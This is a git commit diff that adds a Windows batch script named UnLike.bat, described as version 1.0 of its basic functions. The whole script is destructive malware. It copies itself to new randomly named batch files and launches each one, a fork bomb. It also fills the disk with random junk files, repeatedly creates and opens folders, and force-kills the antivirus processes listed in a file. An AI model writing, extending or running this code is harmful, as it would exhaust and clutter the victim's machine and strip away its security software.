396382b019edfed8356ce270ebd0b1efc3237a86
Arthur Pons <33666394+unguest@users.noreply.github.com>
2017-11-14 22:34:10 +0100

    Creating the basic functions of the version 1.0

--- 1.0/UnLike.bat
+++ 1.0/UnLike.bat
@@ -1,1 +1,25 @@
+@echo off
+:main
+call flood
+call F_Spam
+call F_Blast
 
+:flood
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+
+:F_Spam
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
+
+:F_Blast
+set /A FBlast = %random%
+md %FBlast%
+start %FBlast%
+
+:Kill_AV
+for /f "delims=" %%a in (avs.list) do taskkill /f /im %%a
